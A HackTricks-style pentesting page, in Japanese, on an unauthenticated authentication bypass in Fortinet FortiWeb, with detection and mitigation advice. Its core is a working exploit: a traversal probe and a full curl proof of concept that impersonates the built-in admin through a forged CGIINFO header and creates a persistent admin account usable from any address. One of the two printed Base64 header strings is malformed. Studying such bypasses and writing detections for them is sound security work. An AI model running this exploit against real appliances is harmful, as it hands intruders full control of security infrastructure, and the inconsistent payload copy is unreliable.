# Fortinet FortiWeb — Auth bypass via API-prefix traversal and CGIINFO impersonation

{{#include ../../banners/hacktricks-training.md}}

## 概要

Fortinet FortiWebは、`/cgi-bin/fwbcgi` に集中型CGIディスパッチャを公開しています。  
2つのバグの連鎖により、認証されていないリモート攻撃者は次のことが可能になります：

- URLを有効なAPI prefixで開始し、traversing directoriesすることで`fwbcgi`に到達できる。
- 特殊なHTTP headerを送信し、CGIがそれをidentityとして信頼することで、任意のユーザ（組み込みの`admin`を含む）をimpersonateできる。

ベンダーアドバイザリ: FG‑IR‑25‑910 (CVE‑2025‑64446)。本脆弱性を悪用して永続的なadminユーザを作成する攻撃が実際に観測されています。

影響を受けるバージョン（公表されているもの）:
- 8.0 < 8.0.2
- 7.6 < 7.6.5
- 7.4 < 7.4.10
- 7.2 < 7.2.12
- 7.0 < 7.0.12
- 6.4 ≤ 6.4.3
- 6.3 ≤ 6.3.23

FortiWeb 8.0.2 は以下の traversal probe に対して HTTP 403 を返します。

## クイック脆弱性プローブ

- Path traversal from API prefix to `fwbcgi`:
```http
GET /api/v2.0/cmdb/system/admin/../../../../../cgi-bin/fwbcgi HTTP/1.1
Host: <target>
```
- 解釈: HTTP 200 → 脆弱である可能性が高い; HTTP 403 → 修正済み。

## 根本原因の連鎖

1) API-prefix path traversal to internal CGI
- 有効な FortiWeb API プレフィックス（例: `/api/v2.0/cmdb/` や `/api/v2.0/cmd/`）で始まる任意のリクエストパスは `../` を使って `/cgi-bin/fwbcgi` へトラバースできる。

2) Minimal-body validation bypass
- `fwbcgi` に到達すると、最初のゲートは `/var/log/inputcheck/` 以下のパスごとのファイルに基づく寛容な JSON チェックを実行する。ファイルが存在しない場合、チェックは即座に通過する。存在する場合、ボディは有効な JSON であるだけでよい。最小の準拠ボディとして `{}` を使用する。

3) Header-driven user impersonation
- プログラムは CGI 環境変数 `HTTP_CGIINFO`（HTTP ヘッダ `CGIINFO` に由来）を読み取り、Base64 デコードし、JSON を解析して、属性をログインコンテキストに直接コピーし、domain/VDOM を設定する。注目すべきキー:
- `username`, `loginname`, `vdom`, `profname`
- 組み込み admin を偽装するための例の JSON:
```json
{
"username": "admin",
"profname": "prof_admin",
"vdom": "root",
"loginname": "admin"
}
```
上記のBase64（実際に使用されているもの）:
```
eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwcm9mbmFtZSI6ICJwcm9mX2FkbWluIiwgInZkb201OiAicm9vdCIsICJsb2dpbm5hbWUiOiAiYWRtaW4ifQ==
```
## エンドツーエンドの悪用パターン（認証なし → 管理者）

1) API-prefix traversal を経由して `/cgi-bin/fwbcgi` に到達する。  
2) 入力チェックを満たすために任意の有効なJSONボディ（例: `{}`）を提供する。  
3) ヘッダ `CGIINFO: <base64(json)>` を送信する — このJSONがターゲットの識別情報を定義する。  
4) `fwbcgi` が期待するバックエンドJSONをPOSTして特権操作を実行する（例: 持続性のために管理者ユーザーを作成する）。

### 最小限の cURL PoC

- Probe traversal exposure:
```bash
curl -ik 'https://<host>/api/v2.0/cmdb/system/admin/../../../../../cgi-bin/fwbcgi'
```
- 管理者になりすまし、新しいローカル管理者ユーザーを作成する:
```bash
# Base64(JSON) for admin impersonation
B64='eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwcm9mbmFtZSI6ICJwcm9mX2FkbWluIiwgInZkb20iOiAicm9vdCIsICJsb2dpbm5hbWUiOiAiYWRtaW4ifQ=='

curl -ik \
-H "CGIINFO: $B64" \
-H 'Content-Type: application/json' \
-X POST \
--data '{"data":{"name":"watchTowr","access-profile":"prof_admin","access-profile_val":"0","trusthostv4":"0.0.0.0/0","trusthostv6":"::/0","type":"local-user","type_val":"0","password":"P@ssw0rd!"}}' \
'https://<host>/api/v2.0/cmdb/system/admin/../../../../../cgi-bin/fwbcgi'
```
注意事項:
- 任意の有効な JSON ボディ（例: `{}`）で問題ありません。`/var/log/inputcheck/<path>.json` が存在しない場合はこれで十分です。
- このアクションスキーマは FortiWeb 内部仕様です；上の例はフル権限のローカル管理者を追加します。

## 検出

- `../` を含む API プレフィックス経由のパス（例: `/api/v2.0/cmdb/.../../../../../../cgi-bin/fwbcgi`）を通じて `/cgi-bin/fwbcgi` に到達するリクエスト。
- `username`/`loginname`/`vdom`/`profname` のキーを含む Base64 エンコードされた JSON を持つ `CGIINFO` ヘッダの存在。
- バックエンドのアーティファクト:
- `/var/log/inputcheck/` 以下のパス毎のファイル（gate 設定）。
- 予期しない管理者アカウントの作成や設定の変更。
- 迅速な検証: トラバーサルプローブが 200 を返す（露出）か 403 を返す（修正済みビルドではブロック）。

## 緩和策

- ベンダーのアドバイザリに従い、修正済みリリース（例: 8.0.2, 7.6.5, 7.4.10, 7.2.12, 7.0.12）にアップグレードする。
- パッチ適用までの間:
- FortiWeb の管理プレーンを信頼できないネットワークに晒さない。
- reverse-proxy/WAF ルールを追加して以下をブロックする:
- `/api/` で始まり `../cgi-bin/fwbcgi` を含むパス。
- `CGIINFO` ヘッダを含むリクエスト。
- 上記の検出指標を監視し、アラートを出す。

## 参考

- [When the impersonation function gets used to impersonate users — Fortinet FortiWeb auth bypass (watchTowr Labs)](https://labs.watchtowr.com/when-the-impersonation-function-gets-used-to-impersonate-users-fortinet-fortiweb-auth-bypass/)
- [watchTowr vs FortiWeb Auth Bypass — Detection artefact generator](https://github.com/watchtowrlabs/watchTowr-vs-Fortiweb-AuthBypass)

{{#include ../../banners/hacktricks-training.md}}
